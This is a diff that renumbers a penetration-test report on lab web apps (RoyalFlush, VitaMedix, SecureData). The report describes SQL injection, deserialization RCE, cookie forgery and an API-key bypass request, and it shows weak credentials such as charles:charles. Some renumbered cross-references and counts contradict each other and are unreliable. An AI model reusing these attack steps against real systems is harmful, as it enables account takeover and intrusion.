@@ -95,7 +95,7 @@ From 8 August 2026 to 17 August 2026, Royal Flush Ltd., Secure Data Ltd., and Vi
 
 ### Overall Risk Posture
 
-The assessment identified **24 security findings**, of which **7 are Critical** and **13 are High**. This represents a severe overall risk to the three organizations. Most of the Critical and High findings can be exploited by external attackers without prior access, and several allow complete takeover of user accounts, administrator accounts, or the underlying servers.
+The assessment identified **23 security findings**, of which **7 are Critical** and **12 are High**. This represents a severe overall risk to the three organizations. Most of the Critical and High findings can be exploited by external attackers without prior access, and several allow complete takeover of user accounts, administrator accounts, or the underlying servers.
 
 The most significant risks identified include:
 
@@ -163,45 +163,44 @@ The scope of this assessment was as follows:
 
 ### Summary of Findings
 
-During the course of testing, The tester uncovered a total of 24 findings that pose a material risk to clients' web applications and systems. The below table provides a summary of the findings by severity level.
+During the course of testing, The tester uncovered a total of 23 findings that pose a material risk to clients' web applications and systems. The below table provides a summary of the findings by severity level.
 
  
 
 | Finding Severity |          |            |           |           |           |
 | ---------------- | -------- | ---------- | --------- | --------- | --------- |
 | **Critical**     | **High** | **Medium** | **Low**   | **Info**  | **Total** |
-| **7**            | **13**    | **4**      | **0**     | **0**     | **24**     |
+| **7**            | **12**    | **4**      | **0**     | **0**     | **23**     |
 
 Below is a high-level overview of each finding identified during the course of testing. These findings are covered in depth in the [Technical Findings Details](#technical-findings-details) section of this report.
 
 
 
-| Finding # | Severity Level | Finding Name                 |
-| --------- | -------------- | ---------------------------- |
-| 1. SQL Injection at https://www.royalflush.htb/forgot          | **Critical**   | SQL INJECTION         |
-| 2.   SQL Injection at Vault.royalflush.htb       | **Critical**        | SQL INJECTION |
-| 3.   .NET BinaryFormatter deserialization       | **Critical**        | RCE |
-| 4.    Leaked AUTH_SECRET → cookie forgery      | **Critical**     | Leaked AUTH_SECRET      |
-| 5.   RCE via eval on newsletter.vitamedix.htb       | **Critical**        | RCE |
-| 6.    DNS.vitamedix:8006 Pi-hole password leak (WEBPASSWORD: pihole)    | **Critical**        | Information Disclosure |
-| 7.   PDF generation SSRF via DNS rebinder → internal CouchDB access      | **Critical**        | DNS rebind  |
-| 8.     Role-upgrade bypass via parameter logic flaw (fookey)    | **High**        | Logic Flaw |
-| 9.    NoSQL Injection at verify-email endpoint forum.royalflush.htb    | **High**        | NoSQL Injection|
-| 10.    No domain restriction at registration    | **High**        | Logic Flaw |
-| 11.    Remote Code Execution in http://api.securedata.htb/service_status?service=nginx    | **High**        | RCE |
-| 12.    XSS in http://securedata.htb/admin/admin_panel.php in CLIENT-IP header via Cache-poisoning    | **High**        | XSS |
-| 13.    Creds Leak at forum.royalflush.htb    | **High**        | Information Disclosure |
-| 14.     LDAP injection at ldap.vitamedix.htb    | **High**        | LDAP Injection |
-| 15.  Logic Flaw on Storage.vitamedix.htb → SMTP credentials leak       | **High**        | Logic Flaw |
-| 16.     Email header injection (CRLF) in password reset   | **High**        | CRLF Injection |
-| 17.    NoSQL Injection in validateToken    | **High**        | NoSQL Injection|
-| 18.    DNS rebind => CSRF => Stored Cross-Site Scripting (XSS) => Admin cookie theft    | **High**        | Cross-Site Scripting (XSS) |
-| 19.   XPath injection in q parameter at query.php&home.php       | **High**        | XPath Injection |
-| 20.   Leaked credentials of testdeveloper at Securedata    | **High**        | Information Disclosure |
-| 21.    Race condition on admin_panel.php     | **Medium**        | Race Condition |
-| 22.    request smuggling Attack at securedata.htb    | **Medium**        | Request Smuggling |
-| 23.   Leaked credentials charles:charles on forum.royalflush.htb     | **Medium**        | Leaked Credentials |
-| 24.     Valid email enumeration via forgot-password self-service (michael@vitamedix.htb)   | **Medium**        | Email Enumeration |
+| Finding #                                                                                        | Severity Level | Finding Name               |
+| ------------------------------------------------------------------------------------------------ | -------------- | -------------------------- |
+| 1.    SQL Injection at https://www.royalflush.htb/forgot                                         | **Critical**   | SQL INJECTION              |
+| 2.   SQL Injection at Vault.royalflush.htb                                                       | **Critical**   | SQL INJECTION              |
+| 3.   .NET BinaryFormatter deserialization                                                        | **Critical**   | RCE                        |
+| 4.    Leaked AUTH_SECRET → cookie forgery                                                        | **Critical**   | Leaked AUTH_SECRET         |
+| 5.   RCE via eval on newsletter.vitamedix.htb                                                    | **Critical**   | RCE                        |
+| 6.    DNS.vitamedix:8006 Pi-hole password leak (WEBPASSWORD: pihole)                             | **Critical**   | Information Disclosure     |
+| 7.    PDF generation SSRF via DNS rebinder → internal CouchDB access                             | **Critical**   | DNS rebind                 |
+| 8.    Role-upgrade bypass via parameter logic flaw (fookey)                                      | **High**       | Logic Flaw                 |
+| 9.    NoSQL Injection at verify-email endpoint forum.royalflush.htb                              | **High**       | NoSQL Injection            |
+| 10.  No domain restriction at registration                                                       | **High**       | Logic Flaw                 |
+| 11.  Remote Code Execution in http://api.securedata.htb/service_status?service=nginx             | **High**       | RCE                        |
+| 12.   XSS in http://securedata.htb/admin/admin_panel.php in CLIENT-IP header via Cache-poisoning | **High**       | XSS                        |
+| 13.    Creds Leak at forum.royalflush.htb                                                        | **High**       | Information Disclosure     |
+| 14.     LDAP injection at ldap.vitamedix.htb                                                     | **High**       | LDAP Injection             |
+| 15.  Logic Flaw on Storage.vitamedix.htb → SMTP credentials leak                                 | **High**       | Logic Flaw                 |
+| 16.     Email header injection (CRLF) in password reset                                          | **High**       | CRLF Injection             |
+| 17.    NoSQL Injection in validateToken                                                          | **High**       | NoSQL Injection            |
+| 18.    DNS rebind => CSRF => Stored Cross-Site Scripting (XSS) => Admin cookie theft             | **High**       | Cross-Site Scripting (XSS) |
+| 19.   XPath injection in q parameter at query.php&home.php                                       | **High**       | XPath Injection            |
+| 20.    Race condition on admin_panel.php                                                         | **Medium**     | Race Condition             |
+| 21.    request smuggling Attack at securedata.htb                                                | **Medium**     | Request Smuggling          |
+| 22.   Leaked credentials charles:charles on forum.royalflush.htb                                 | **Medium**     | Leaked Credentials         |
+| 23.     Valid email enumeration via forgot-password self-service (michael@vitamedix.htb)         | **Medium**     | Email Enumeration          |
 
 
 
@@ -210,7 +209,7 @@ Below is a high-level overview of each finding identified during the course of t
 ### Assessment Overview and Recommendations
 
                                                                                                                                                                                           
-   During the course of testing, 24 material findings were identified across the RoyalFlush, VitaMedix, and SecureData environments. The findings are predominantly rated Critical and High, 
+   During the course of testing, 23 material findings were identified across the RoyalFlush, VitaMedix, and SecureData environments. The findings are predominantly rated Critical and High, 
    reflecting severe, readily exploitable weaknesses that expose the applications to unauthorized access, remote code execution, and lateral movement into internal infrastructure.          
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                              
@@ -224,8 +223,8 @@ Below is a high-level overview of each finding identified during the course of t
    • Leaked AUTH_SECRET → cookie forgery (Finding #4, Critical): Allows an attacker to forge authentication cookies for administrative users.                                                
    • SQL Injection in Vault.royalflush.htb (Finding #2, Critical): Permits authenticated database access and file reads.                                                                     
    • .NET BinaryFormatter deserialization (Finding #3, Critical): Leads to remote code execution on the Vault server.                                                                        
-   • Role-upgrade logic flaw via fookey (Finding #6, High): Bypasses API key validation through parameter pollution.                                                                         
-   • Hardcoded credentials charles:charles (Finding #23, Medium): Default/weak credentials on the forum.                                                                                        
+   • Role-upgrade logic flaw via fookey (Finding #8, High): Bypasses API key validation through parameter pollution.                                                                         
+   • Hardcoded credentials charles:charles (Finding #22, Medium): Default/weak credentials on the forum.                                                                                        
    • NoSQL Injection at verify-email (Finding #9, High): Allows manipulation of email verification queries.                                                                                  
    • No domain restriction at registration (Finding #10, High): Permits registration using arbitrary domains.                                                                                 
    • Credential exposure on the forum (Finding #13, High): Additional passwords and emails disclosed in forum responses.                                                                     
@@ -239,14 +238,14 @@ Below is a high-level overview of each finding identified during the course of t
    VitaMedix contains a critical remote-code-execution weakness and several high-severity input-validation and access-control flaws.                                                         
                                                                                                                                                                                              
    • RCE via eval (Finding #5, Critical): User-supplied input is passed directly to eval() on newsletter.vitamedix.htb.                                                                      
-   • LDAP injection (Finding #11, High): Enables username/password enumeration via ldap.vitamedix.htb.                                                                                       
-   • BOLA/IDOR on Storage.vitamedix.htb (Finding #12, High): render.php reads arbitrary file IDs from session without ownership checks, leaking SMTP credentials.                            
+   • LDAP injection (Finding #14, High): Enables username/password enumeration via ldap.vitamedix.htb.                                                                                       
+   • BOLA/IDOR on Storage.vitamedix.htb (Finding #15, High): render.php reads arbitrary file IDs from session without ownership checks, leaking SMTP credentials.                            
    • Email header injection (CRLF) (Finding #16, High): Allows header manipulation in password-reset emails.                                                                                 
-   • Pi-hole password leak (Finding #14, High): WEBPASSWORD: pihole exposed for DNS.vitamedix:8006.                                                                                          
-   • PDF generation SSRF via DNS rebinder (Finding #15, High): Forces the PDF generator to fetch internal CouchDB content.                                                                   
+   • Pi-hole password leak (Finding #6, Critical): WEBPASSWORD: pihole exposed for DNS.vitamedix:8006.                                                                                          
+   • PDF generation SSRF via DNS rebinder (Finding #7, Critical): Forces the PDF generator to fetch internal CouchDB content.                                                                   
    • NoSQL Injection in verifyToken (Finding #17, High): Regex-based NoSQL injection leaks account-creation tokens.                                                                          
    • Stored XSS (Finding #18, High): Payload stored in user settings executes in the admin browser.                                                                                          
-   • Valid email disclosure (Finding #24, Medium): Forgot-password response confirms michael@vitamedix.htb.                                                                                     
+   • Valid email disclosure (Finding #23, Medium): Forgot-password response confirms michael@vitamedix.htb.                                                                                     
                                                                                             
                                                                                                                                                                                              
   ###### Overall risk: Insecure evaluation, injection flaws, and broken access controls expose VitaMedix to critical remote compromise and internal service access.                              
@@ -255,11 +254,14 @@ Below is a high-level overview of each finding identified during the course of t
                                                                                                                                                                                              
    #### SecureData                                                                                                                                                                                
                                                                                                                                                                                              
-   SecureData contained three findings, all rated High or lower.                                                                                                                             
+   SecureData contained two findings, all rated High or lower.                                                                                                                             
                                                                                                                                                                                              
-   • XPath injection in q parameter (Finding #18, High): Manipulation of XML queries at query.php / home.php.                                                                                
-   • Leaked testdeveloper credentials (Finding #19, High): Authentication material exposed in the application.                                                                               
-   • Race condition on admin_panel.php (Finding #21, Medium): Simultaneous privileged/unprivileged requests can return the admin panel.                                                      
+   • XPath injection in q parameter (Finding #19, High): Manipulation of XML queries at query.php / home.php.
+   • Race condition on admin_panel.php (Finding #20, Medium): Simultaneous privileged/unprivileged requests can return the admin panel. 
+   •  request smuggling Attack at securedata.htb
+   •  XSS in http://securedata.htb/admin/admin_panel.php in CLIENT-IP header via Cache-poisoning
+   •   Remote Code Execution in http://api.securedata.htb/service_status?service=nginx
+                                                        
                                                                                                                                                                                              
    ###### Overall risk: These weaknesses present meaningful risk to SecureData's confidentiality and integrity, though they are less severe than the Critical findings in RoyalFlush and  VitaMedix.                                                                                                                                                                              
                                                                                                                                                                                              
@@ -267,17 +269,17 @@ Below is a high-level overview of each finding identified during the course of t
                                                                                                                                                                                              
    ### Key Recommendations                                                                                                                                                                       
                                                                                                                                                                                              
-   1. Eliminate injection vulnerabilities by parameterizing all database, LDAP, XPath, and NoSQL queries, and enforce strict allow-lists for user input (Findings #1, #2, #9, #11, #16, #18).
-   2. Rotate and protect secrets — move AUTH_SECRET, SMTP credentials, Pi-hole WEBPASSWORD, and developer credentials into a secrets manager or environment variables (Findings #4, #12, #14,
-      #19).                                                                                                                                                                                  
-   3. Disable dangerous evaluation functions such as eval() and replace them with safe parsers (Finding #5).                                                                                 
-   4. Replace insecure deserialization — migrate from .NET BinaryFormatter to JsonSerializer and cryptographically sign serialized data (Finding #3).                                        
-   5. Enforce authorization on every endpoint, ensuring users cannot access others' resources or manipulate role/token parameters (Findings #6, #12, #17, #21).                              
-   6. Harden email handling by sanitizing input to prevent CRLF injection and restricting registration to approved domains (Findings #10, #16, #24).                                          
-   7. Mitigate XSS through output encoding, context-aware validation, and a restrictive Content Security Policy (Finding #17).                                                               
-   8. Prevent SSRF in PDF generation and similar features by resolving hostnames internally and enforcing strict destination allow-lists (Finding #15).                                      
-   9. Remove default or weak credentials, enforce multi-factor authentication for privileged accounts, and rotate credentials regularly (Findings #13, #23).                                  
-   10. Conduct a source-code review to remove information disclosures such as internal URLs, stack traces, and verbose error messages from production responses.               
+   12. Eliminate injection vulnerabilities by parameterizing all database, LDAP, XPath, and NoSQL queries, and enforce strict allow-lists for user input (Findings #1, #2, #9, #11, #16, #18).
+   13. Rotate and protect secrets — move AUTH_SECRET, SMTP credentials, Pi-hole WEBPASSWORD, and weak/default forum credentials into a secrets manager or environment variables (Findings #4, #14, #15,
+      #22).                                                                                                                                                                                  
+   14. Disable dangerous evaluation functions such as eval() and replace them with safe parsers (Finding #5).                                                                                 
+   15. Replace insecure deserialization — migrate from .NET BinaryFormatter to JsonSerializer and cryptographically sign serialized data (Finding #3).                                        
+   16. Enforce authorization on every endpoint, ensuring users cannot access others' resources or manipulate role/token parameters (Findings #8, #12, #17, #20).                              
+   17. Harden email handling by sanitizing input to prevent CRLF injection and restricting registration to approved domains (Findings #10, #16, #23).                                          
+   18. Mitigate XSS through output encoding, context-aware validation, and a restrictive Content Security Policy (Finding #18).                                                               
+   19. Prevent SSRF in PDF generation and similar features by resolving hostnames internally and enforcing strict destination allow-lists (Finding #7).                                      
+   20. Remove default or weak credentials, enforce multi-factor authentication for privileged accounts, and rotate credentials regularly (Findings #13, #22).                                  
+   21. Conduct a source-code review to remove information disclosures such as internal URLs, stack traces, and verbose error messages from production responses.               
                                                                                                                                                                                              
 ###### Remediation priority: Address all Critical and High findings immediately to prevent full application or infrastructure compromise. Medium and Low findings should be remediated in the  next maintenance cycle.                                                                                                                                                                 
                                
@@ -335,7 +337,7 @@ A successful SQL Injection (SQLi) attack targeting the `/forgot` endpoint allows
 
 Because the injected queries run with the privileges of the database user configured in `www/util/db.py`, an attacker can enumerate and exfiltrate data across all accessible databases, schemas, tables, and columns on the connected PostgreSQL instance.
 
-### Database Schema Exposure (`royalflush`)
+#### Database Schema Exposure (`royalflush`)
 
 Within the primary application database (`royalflush`), the attacker can directly query and exfiltrate data from the following tables and columns:
 
@@ -368,7 +370,7 @@ cursor.execute("SELECT user_id FROM users WHERE email = '%s'" % (email,))
 
 Because user input from the `email` field is directly concatenated into the query, an attacker can manipulate the query structure. Although the application attempts to filter malicious inputs using an `@anti_sqli` decorator, the filter relies on simple regex patterns that are easily bypassed using alternative PostgreSQL syntax.
 
-### How We Confirmed It
+#### How We Confirmed It
 
 We verified the flaw by issuing a time-based blind SQL injection payload in the `email` parameter:
 
@@ -400,7 +402,7 @@ this lead to dump of user data
 `chandler******:lbr***@hotmail.com
 `
 
-### Why the `@anti_sqli` Filter Failed
+#### Why the `@anti_sqli` Filter Failed
 
 The `@anti_sqli` decorator attempts to block attacks by searching for common SQL keywords and character sequences (like `;` or `--`). However, blacklist filters are almost always incomplete. In this case, the filter failed because the payload:
 
@@ -413,7 +415,7 @@ This highlights a fundamental issue: pattern-based filtering cannot reliably sto
 
 #### Patching and Remediation
 
-### Primary Fix: Implementation of Parameterized Queries
+#### Primary Fix: Implementation of Parameterized Queries
 
 The vulnerability stems from user input being directly concatenated into the SQL statement via Python string formatting:
 
@@ -447,7 +449,7 @@ def forgot():
                 ...
 ```
 
-### Additional Defensive Recommendations
+#### Additional Defensive Recommendations
 
 #### 1. Eliminate Blacklist-Based Filters
 
@@ -507,7 +509,7 @@ CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (9.3 - Critical)
 
 #### Description & Cause
 
-### Finding: Hardcoded Secrets Exposed via Git Repository History
+#### Finding: Hardcoded Secrets Exposed via Git Repository History
 
 During the repository analysis, the pentester discovered that the application’s full `.env` configuration file was committed in the initial Git commit. This file contained critical operational credentials, including database access passwords, keys used to sign Flask sessions, cookie authentication secrets, and administrative API keys.
 
@@ -539,7 +541,7 @@ Sensitive environment configuration was stored alongside application source code
 
 #### Security Impact
 
-### Exploitation Vectors & Impact Breakdown
+#### Exploitation Vectors & Impact Breakdown
 
 With access to the leaked `.env` secrets, an attacker can exploit the application across multiple vectors:
 
@@ -566,13 +568,13 @@ With access to the leaked `.env` secrets, an attacker can exploit the applicatio
 
 #### Detailed Walkthrough
 
-### Discovery
+#### Discovery
 
 During a review of the application source code and commit history, the complete `.env` configuration file was identified in the repository's initial commit. Although modified in subsequent commits, the initial commit remained accessible in Git history. This file contained operational secrets, including `AUTH_SECRET`, which is used by the application to sign user authentication cookies.
 
 ![](assets/edited-VmwcSTyd.png){width="auto"}
 
-### Secret Extraction & Mechanism Analysis
+#### Secret Extraction & Mechanism Analysis
 
 The `AUTH_SECRET` key was recovered from the historical `.env` file. Analysis of `www/util/auth.py` indicated that this secret is used to generate HMAC-SHA256 signatures over a YAML payload containing:
 
@@ -580,7 +582,7 @@ The `AUTH_SECRET` key was recovered from the historical `.env` file. Analysis of
 * `username`
 * `expires_at`
 
-### Cookie Forgery
+#### Cookie Forgery
 
 Using the recovered `AUTH_SECRET`, an authentication token was generated targeting a specific user account:
 
@@ -601,7 +603,7 @@ Saved to: cookie_lbrown_hotmail_com.txt
 ```
 
 
-### Verification & Impact
+#### Verification & Impact
 
 When the forged cookie was set in the browser and applied to subsequent application requests, the server accepted the token as legitimate:
 
@@ -614,7 +616,7 @@ When the forged cookie was set in the browser and applied to subsequent applicat
 
 #### Patching and Remediation
 
-### 1. Immediate Actions
+#### 1. Immediate Actions
 
 * **Rotate all exposed secrets immediately:**
 
@@ -640,7 +642,7 @@ When the forged cookie was set in the browser and applied to subsequent applicat
 
   * Force all users to re-authenticate after rotating `AUTH_SECRET` and `APP_SECRET`.
 
-### 2. Remove Secrets from Version-Control History
+#### 2. Remove Secrets from Version-Control History
 
 > Deleting the `.env` file from the current branch is **not enough**. Secrets remain in Git history and can be recovered using `git log` or `git show`.
 
@@ -667,7 +669,7 @@ git push origin --force --all
 
 If rewriting history is not feasible, rotate the secrets and add monitoring. Accept that old values remain in history but ensure they are no longer valid.
 
-### 3. Prevent Future Commits of Secrets
+#### 3. Prevent Future Commits of Secrets
 
 * **Add `.env` to `.gitignore`:**
 
@@ -691,7 +693,7 @@ If rewriting history is not feasible, rotate the secrets and add monitoring. Acc
 
 * **Use Different Secrets per Environment:** Production, staging, and development must each use unique credentials. Never reuse production secrets in lower environments.
 
-### 4. Improve Authentication Architecture
+#### 4. Improve Authentication Architecture
 
 * **Transition to Server-Side Sessions:** Move away from purely stateless signed tokens where feasible. Store session identifiers server-side (*e.g., Redis, PostgreSQL*) bound to user accounts to enable:
 
@@ -705,7 +707,7 @@ If rewriting history is not feasible, rotate the secrets and add monitoring. Acc
 
 * **Implement Token Rotation & Short Expiration:** Reduce token lifetimes and rotate signing keys periodically. Avoid long-lived tokens.
 
-### 5. Additional Hardening
+#### 5. Additional Hardening
 
 * **Configure Pre-Commit Hooks:** Integrate scanning tools to block hardcoded secrets prior to commit:
 
@@ -737,7 +739,7 @@ If rewriting history is not feasible, rotate the secrets and add monitoring. Acc
 
 * **Rotate Infrastructure Credentials:** If database credentials or SMTP keys were reused across other services, rotate those secondary instances as well.
 
-### 6. Verification
+#### 6. Verification
 
 After applying patches, run:
 
@@ -773,7 +775,7 @@ CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:L/SI:N/SA:N (8.7 - High)
 
 #### Description & Cause
 
-## Summary
+#### Summary
 
 A critical Authorization bypass exists in the `api_key_required` decorator protecting the `/api/changeUserRole` endpoint.
 
@@ -781,7 +783,7 @@ The validation logic contains a structural mismatch: it checks for the presence 
 
 An unauthorized attacker can exploit this discrepancy by passing a parameter name that contains `key=` as a substring (such as `fkey=`). This satisfies the raw query string check while causing `request.args.get('key')` to return `None`. Because `None` is neither an empty string nor truthy, all validation checks are bypassed, allowing the request to execute state-changing actions without API key verification.
 
-## Vulnerable Code
+#### Vulnerable Code
 
 Located in `www/__init__.py:36-47`:
 
@@ -806,11 +808,11 @@ def api_key_required(f):
     return decorator
 ```
 
-## Root Cause Analysis & Exploitation Flow
+#### Root Cause Analysis & Exploitation Flow
 
 When an attacker sends a request like `/api/changeUserRole?fkey=123&user_id=1&role_id=2`, the authentication logic breaks down in four steps:
 
-### 1. Substring Check on Raw Query String
+#### 1. Substring Check on Raw Query String
 
 
 
@@ -820,7 +822,7 @@ if 'key=' not in request.query_string.decode():
 
 The guard inspects the raw URL string for the contiguous character sequence `k-e-y-=`. Passing `fkey=123` satisfies this check because `"key="` exists inside `"fkey="`, so execution continues.
 
-### 2. Parameter Lookup Mismatch
+#### 2. Parameter Lookup Mismatch
 
 
 
@@ -830,7 +832,7 @@ api_key = request.args.get('key')
 
 Flask parses query parameters strictly by exact key name. Because the actual parameter sent was `fkey` and not `key`, `request.args.get('key')` returns `None`.
 
-### 3. Empty String Check Bypass
+#### 3. Empty String Check Bypass
 
 
 
@@ -840,7 +842,7 @@ if api_key == "":
 
 The code checks whether the API key is an empty string (`""`). Because `api_key` is `None` (non-existent parameter) rather than `""` (empty parameter), `None == ""` evaluates to `False`. This check is safely bypassed.
 
-### 4. Falsy Guard Bypass
+#### 4. Falsy Guard Bypass
 
 
 
@@ -864,13 +866,13 @@ The breakdown of the `api_key_required` decorator leads to severe, application-w
 
 #### Detailed Walkthrough
 
-## Discovery
+#### Discovery
 
 During source-code review, the `api_key_required` decorator in `www/__init__.py` was identified as the access-control mechanism for administrative API endpoints.
 
 Closer inspection revealed that the decorator validated the presence of the substring `"key="` in the raw query string, but then retrieved the API key value using `request.args.get('key')`. This mismatch meant that any parameter name containing `"key="` as a substring—such as `fkey`—would satisfy the initial check while causing `request.args.get('key')` to return `None`. Because `None` is falsy, the validation comparison against `API_SECRET` was skipped completely, bypassing the authentication requirement.
 
-## Exploitation
+#### Exploitation
 
 The target endpoint `/api/changeUserRole` is intended to require a valid API key. To exploit the logic flaw, the following request was crafted without providing a legitimate `key` parameter:
 
@@ -888,7 +890,7 @@ Host: www.royalflush.htb
 UPDATE user_roles SET role_id = 2 WHERE user_id = <attacker_user_id>
 ```
 
-## Result
+#### Result
 
 The targeted account was successfully promoted to administrator (`role_id = 2`). Upon refreshing the session, the `/admin` dashboard became fully accessible, exposing the entire user directory and revealing the `admin_secret`.
 
@@ -901,11 +903,11 @@ The targeted account was successfully promoted to administrator (`role_id = 2`).
 
 #### Patching and Remediation
 
-## Primary Fix — Correct the API Key Validation Logic
+#### Primary Fix — Correct the API Key Validation Logic
 
 The `api_key_required` decorator must check the actual parameter or header value, not a substring of the raw query string. Replace the flawed logic in `www/__init__.py:36-47`.
 
-###  Fix the Existing Query-Parameter Approach
+#### Fix the Existing Query-Parameter Approach
 
 ```python
 def api_key_required(f):
@@ -925,7 +927,7 @@ def api_key_required(f):
 * Only a parameter literally named `key` is accepted.
 * An empty or missing key returns `403`.
 * The value is securely compared against `API_SECRET`.
-## Add Authentication and Authorization to `/api/changeUserRole`
+#### Add Authentication and Authorization to `/api/changeUserRole`
 
 The endpoint must verify that the caller is logged in and has administrative privileges. The API key alone should **not** grant access to role changes.
 
@@ -948,13 +950,13 @@ def api_changeUserRole():
     return "OK"
 ```
 
-### Key Changes:
+#### Key Changes:
 
 * **`methods=['POST']`**: Role changes are state-modifying actions and must not use `GET`.
 * **`@login_required`**: Ensures a valid session exists.
 * **`@admin_required`**: Ensures only administrators can modify user roles.
 
-### Example Decorators:
+#### Example Decorators:
 
 ```python
 def login_required(f):
@@ -976,11 +978,11 @@ def admin_required(f):
     return decorator
 ```
 
-## Rotate the API Secret
+#### Rotate the API Secret
 
 > **Critical Note:** Because the original `API_SECRET` was exposed in version-control history, rotate it immediately in your environment variables and treat the old value as fully compromised.
 
-## Apply the Same Fix to All API Endpoints
+#### Apply the Same Fix to All API Endpoints
 
 The same authentication bypass affects multiple endpoints:
 
@@ -988,14 +990,14 @@ The same authentication bypass affects multiple endpoints:
 * `/api/changeUserPassword` (`www/__init__.py:222`)
 * `/api/changeUserRole` (`www/__init__.py:241`)
 
-### Implementation Standards for Endpoints:
+#### Implementation Standards for Endpoints:
 
 1. Use `POST`, not `GET`.
 2. Require a valid user session.
 3. Enforce proper authorization checks (IDOR prevention).
 4. Accept `user_id` modifications **only from administrators**; normal users should only be permitted to modify their own active account session.
 
-### Example for Non-Admin User Endpoints:
+#### Example for Non-Admin User Endpoints:
 
 ```python
 @app.route('/api/changeUsername', methods=['POST'])
@@ -1042,7 +1044,7 @@ During initial reconnaissance, public content on the **RoyalFlush forum** was re
 
 This public disclosure allowed an unauthenticated attacker to infer the exact account credentials (`char***:char***`). Using these credentials, authentication to the main **RoyalFlush application** was successfully established, leading to an Account Takeover (ATO) of a standard user.
 
-## Root Causes
+#### Root Causes
 
 1. **Sensitive Information Disclosure (Public Channel)**
 
@@ -1061,11 +1063,11 @@ This public disclosure allowed an unauthenticated attacker to infer the exact ac
 
 #### Detailed Walkthrough
 
-## Initial Reconnaissance & Credential Disclosure
+#### Initial Reconnaissance & Credential Disclosure
 
 During the initial reconnaissance phase, public content on the **RoyalFlush forum** (`[http://forum.royalflush.htb](http://forum.royalflush.htb)`) was analyzed. A thread was identified in which an administrator posted a public message advising a user named `char***` not to set his password to be identical to his username.
 
-### Credential Inference
+#### Credential Inference
 
 Based on the explicit disclosure in the public forum thread, the target credentials were inferred as:
 
@@ -1073,13 +1075,13 @@ Based on the explicit disclosure in the public forum thread, the target credenti
 * **Password:** `char***`
 
 ![](assets/edited-u7it1eUq.png){width="auto"}
-## Exploitation & Verification
+#### Exploitation & Verification
 
 1. Navigated to the primary RoyalFlush login portal at `[https://www.royalflush.htb/login](https://www.royalflush.htb/login)`.
 2. Submitted the inferred credentials (`char***:char***`).
 3. The authentication request was successful, yielding a valid session for the target account.
 
-## Post-Exploitation & Impact Assessment
+#### Post-Exploitation & Impact Assessment
 
 * **Access Level:** Successfully authenticated as `char***`.
 * **Privilege Level:** Inspection of the session context confirmed the account operates with default standard privileges .
@@ -1088,9 +1090,9 @@ Based on the explicit disclosure in the public forum thread, the target credenti
 
 #### Patching and Remediation
 
-## Remediation & Mitigation Strategy
+#### Remediation & Mitigation Strategy
 
-### 1. Immediate Actions
+#### 1. Immediate Actions
 
 1. **Force Account Password Reset:**
 
@@ -1108,7 +1110,7 @@ Based on the explicit disclosure in the public forum thread, the target credenti
    * Perform an automated database search across historical forum threads for keywords such as `password`, `login`, `credentials`, or plain-text patterns.
    * Scrub any secondary sensitive disclosures identified during the sweep.
 
-### 2. Preventing Weak Passwords
+#### 2. Preventing Weak Passwords
 
 4. **Enforce Strong Password Policies:** Update registration and password-reset controllers to strictly reject weak or predictable input, including passwords matching the username or common dictionary entries.
 
@@ -1144,7 +1146,7 @@ Based on the explicit disclosure in the public forum thread, the target credenti
 
    * Implement real-time client-side feedback mechanisms to guide users toward higher-entropy passphrases.
 
-### 3. Operational Guidance & Process Improvements
+#### 3. Operational Guidance & Process Improvements
 
 6. **Administrative Security Awareness:**
 
@@ -1152,7 +1154,7 @@ Based on the explicit disclosure in the public forum thread, the target credenti
    * Restrict support communications exclusively to authenticated, encrypted ticketing channels.
 
 
-### 4. Technical Hardening
+#### 4. Technical Hardening
 
 7. **Implement Login Rate Limiting:** Thwart automated credential-stuffing and brute-force attacks by enforcing rate limiting at the API gateway or application layer.
 
@@ -1176,11 +1178,11 @@ Based on the explicit disclosure in the public forum thread, the target credenti
 
     * Deploy Time-based One-Time Password (TOTP) or FIDO2/WebAuthn MFA options to prevent unauthorized access even in the event of password compromise.
 
-### 5. Verification & Remediation Testing
+#### 5. Verification & Remediation Testing
 
 Post-patch verification must confirm the following operational controls:
 
-* **Credential Invalidation:** The `charles:charles` credential pair is rejected by the authentication endpoint.
+* **Credential Invalidation:** The `char***:char***` credential pair is rejected by the authentication endpoint.
 * **Content Scrubbing:** The public forum thread no longer exposes sensitive user information.
 * **Input Validation:** Password update forms actively reject weak patterns (e.g., `password == username`).
 * **Rate Limiting:** Excessive consecutive login requests trigger an HTTP `429 Too Many Requests` response.
@@ -1213,9 +1215,9 @@ The application’s authentication logic contains an improper privilege manageme
 
 Because registration is completely unconstrained, an unauthenticated attacker can register an arbitrary account using the target domain (e.g., `attacker@royalflush.htb`). Upon logging in, the application assigns `isStaff = true` in the user's session, resulting in full horizontal and vertical privilege escalation to staff-level functionalities.
 
-## Root Causes & Architectural Flaws
+#### Root Causes & Architectural Flaws
 
-### 1. Missing Registration Domain Validation
+#### 1. Missing Registration Domain Validation
 
 In `AuthController.php:handleCreateAccount`, the application accepts and stores user-supplied email input without enforcing domain whitelists, checking user authorization, or requiring administrative pre-approval.
 
@@ -1228,7 +1230,7 @@ $email = $request->input('email');
 $user['email'] = $email;
 ```
 
-### 2. Implicit Privilege Assignment Based on Identifier
+#### 2. Implicit Privilege Assignment Based on Identifier
 
 Staff privileges are assigned strictly via string parsing of the email address rather than relying on explicit, database-backed Role-Based Access Control (RBAC).
 
@@ -1245,7 +1247,7 @@ public static function isUserStaff($email) {
 * **Flaw:** Implicitly trusts user-controllable input (`email`) as an authoritative privilege indicator.
 * **Impact:** Any account created with the matching suffix inherits staff permissions immediately.
 
-### 3. Non-Functional Identity & Domain Verification
+#### 3. Non-Functional Identity & Domain Verification
 
 While `handleCreateAccount` generates a verification token and `handleLogin` checks `$user['verified'] == true`, the underlying identity verification mechanism fails to validate domain control:
 
@@ -1264,7 +1266,7 @@ While `handleCreateAccount` generates a verification token and `handleLogin` che
 
 #### Detailed Walkthrough
 
-### Source-Code Review
+#### Source-Code Review
 
 While reviewing the forum source code at `/home/hassan/Desktop/code/forum-main/forum`, the pentester examined the account-registration flow in `app/Http/Controllers/AuthController.php` and the staff-check logic in `app/Services/AuthService.php`.
 
@@ -1274,7 +1276,7 @@ The pentester observed that:
 1. The registration handler accepts any email address without validating the domain.
 2. The `isUserStaff()` function grants staff privileges automatically when the email domain is `royalflush.htb`.
 
-### Exploitation
